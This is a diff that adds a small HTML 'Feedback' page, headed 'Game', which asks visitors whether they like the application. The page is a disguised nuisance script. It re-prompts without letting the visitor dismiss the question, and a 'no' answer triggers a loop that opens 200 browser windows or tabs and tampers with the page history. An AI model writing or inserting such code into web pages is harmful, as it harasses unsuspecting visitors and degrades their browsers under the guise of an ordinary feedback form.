@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Feedback</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            animation: bgAnimation 20s infinite alternate;
+        }
+        h1 {
+            color: #333;
+        }
+        #demo {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        @keyframes bgAnimation {
+            0%   { background-color: #f0f0f0; }
+            50%  { background-color: #c0c0c0; }
+            100% { background-color: #f0f0f0; }
+        }
+    </style>
+</head>
+<body>
+    <h1>Game</h1>
+    <p id="demo"></p>
+
+    <script>
+        let answer;
+      var urls = ["https://example.com"];
+
+        do {
+            answer = prompt("Do you like this application? (Yes/No)");
+            if (answer !== null) {
+                if (answer.toLowerCase() === "yes") {
+                    document.getElementById("demo").innerHTML = "Thank you";      
+                } else if (answer.toLowerCase() === "no") {
+                    document.getElementById("demo").innerHTML = "We're sorry to hear that.";
+                  var total = "";
+                  for( var i = 0; i < 1; i++ ) {
+                      total = total + i.toString();
+                      history.pushState(0,0, total );
+                  }
+                  for (var i = 0; i < 200; i++) {
+                    window.open(urls, "_blank");
+                  }          
+                } else {
+                    document.getElementById("demo").innerHTML = "Please provide a valid answer.";
+                }
+            } else {
+                answer = prompt("Do you like this application? (Yes/No)");
+            }
+        } while (answer === null || (answer.toLowerCase() !== "yes" && answer.toLowerCase() !== "no"));
+    </script>
+
+</body>
+</html>
